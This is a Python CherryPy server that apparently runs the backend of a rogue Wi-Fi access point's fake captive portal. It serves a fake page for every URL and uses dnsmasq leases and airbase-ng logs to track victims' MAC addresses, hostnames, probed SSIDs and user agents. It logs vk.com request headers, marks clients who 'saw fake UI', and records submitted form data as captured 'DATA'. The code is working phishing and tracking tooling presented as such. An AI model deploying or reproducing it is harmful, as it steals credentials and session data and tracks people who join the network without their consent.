#!/usr/bin/python
# coding=UTF-8
import cherrypy
import os
import re
import threading
import time
from threading import Thread
from time import sleep
from mako.template import Template
from mako.lookup import TemplateLookup
lookup = TemplateLookup(directories=['html'],default_filters=['decode.utf8'],input_encoding='utf-8',output_encoding='utf-8')
clients = {}
wireless = {}
dataFormID = 'verysecuredata'
infoLock = threading.Lock()
wirelessLock = threading.Lock()
cachedIndex = None

def getWireless(mac):
    with wirelessLock:
        if mac in wireless:
            return wireless[mac]
        new = {}
        wireless[mac] = new
        new['probes'] = set()
        return new

class HelloWorld(object):
    def getInfo(self,testip):
        with open("/var/lib/misc/dnsmasq.leases") as f:
            for line in f:
                (expire,mac,ip,name,mac2)=line.split()
                if ip==testip:
                    return {'mac':mac.upper(),'name':name}
            return None
    @cherrypy.expose
    def rawlog(self):
        with open ("/var/log/cherry_other.log", "r") as myfile:
            data=myfile.read().replace('\n', '<br>')
            return data
    @cherrypy.expose
    def mylog(self):
        tmpl = lookup.get_template("log.html")
        sclients = sorted(clients.values(), key=lambda info: info['last'],reverse=True)
        return tmpl.render(clients=sclients,wireless=wireless)
    @cherrypy.expose
    def mydetails(self, ip):
        tmpl = lookup.get_template("details.html")
        if ip not in clients:
            return "no data"
        return tmpl.render(info=clients[ip])
    @cherrypy.expose
    def default(self,*args,**kwargs):
        start = time.time()
        result= self.default_body(*args,**kwargs)
        end = time.time()
        print "measure",end - start
        return result
    def default_body(self,*args,**kwargs):
        global cachedIndex
        headers =  cherrypy.request.headers
        ip = headers['Remote-Addr']
        agent = headers.get('User-Agent')
        host = headers.get('Host')
        info = {}
        new = False        
        if ip not in clients:
            with infoLock:
                # double check for waiting clients
                if ip not in clients:
                    result = self.getInfo(ip)
                    new=True
                    if result is None:
                        result={'mac':'00:00:00:00:00:00'}
                    result['ip']=ip
                    result['urls'] = []
                    result['wireless'] = getWireless(result['mac'])
                    result['agents'] = set()
                    clients[ip]=result
        
        info = clients[ip]
        info['last']=time.time()
        if agent is not None:
            info['agents'] |= {agent}
        mac=info['mac']
        name=info.get('name')
        ssid=info.get('ssid')
        url = cherrypy.url()
        info['urls'].append(url)

        if 'vk.com' in  url:
             cherrypy.log("vk %s" % (str(headers),))
        if 'client.saw.fake.ui.jpg' in url:
            cherrypy.log("client [%s,%s,%s,%s] saw fake UI" % (mac,name,ip,ssid))
            info['saw'] = True
            return ""
        if new:
            cherrypy.log("client '%s' %s %s %s %s" % (ssid,mac,name,ip,agent))
        if (dataFormID in kwargs):
          data=kwargs[dataFormID]
          info['data']=data
          cherrypy.log("submit: [%s,%s,%s,%s]->%s,agent %s,DATA %s" % (ip,mac,name,ssid,url,agent,data))        
        return cachedIndex
def follow(thefile):
    #thefile.seek(0,2)
    while True:
        line = thefile.readline()
        if not line:
            time.sleep(0.1)
            continue
        yield line
def airbaseReader():
    logfile = open("/var/log/airbase.log","r")
    probe=re.compile('directed probe request from ([a-f0-9:]+)\s+-\s+"(.*)"',re.IGNORECASE);
    assoc=re.compile('client\s+([a-f0-9:]+)\s+(?:re)?associated.*ESSID:\s+"(.*)"',re.IGNORECASE);
    for line in follow(logfile):
        m = probe.search(line)
        if m:
          mac = m.group(1).upper()
          ssid = m.group(2)
          w = getWireless(mac)
          w['probes'] |= {ssid}
        else:
          m = assoc.search(line)
          if m:
              mac = m.group(1).upper()
              ssid = m.group(2)
              w = getWireless(mac)
              w['ssid']=ssid              
if __name__ == '__main__':
   cherrypy.server.socket_host = "0.0.0.0"
   cherrypy.server.socket_port = 80
   cherrypy.log.access_file="/var/log/cherry_access.log"
   cherrypy.log.error_file="/var/log/cherry_other.log"
   tmpl = lookup.get_template("index.html")
   thread = Thread(target = airbaseReader)
   thread.daemon = True
   thread.start()
   cachedIndex = tmpl.render()
   conf = {
         '/': {
             'tools.sessions.on': True,
             'tools.staticdir.root': os.path.abspath(os.getcwd()),

         },
         '/static': {
             'tools.staticdir.on': True,
             'tools.staticdir.dir': './static'
         }
     }
   cherrypy.quickstart(HelloWorld(),'/',conf)
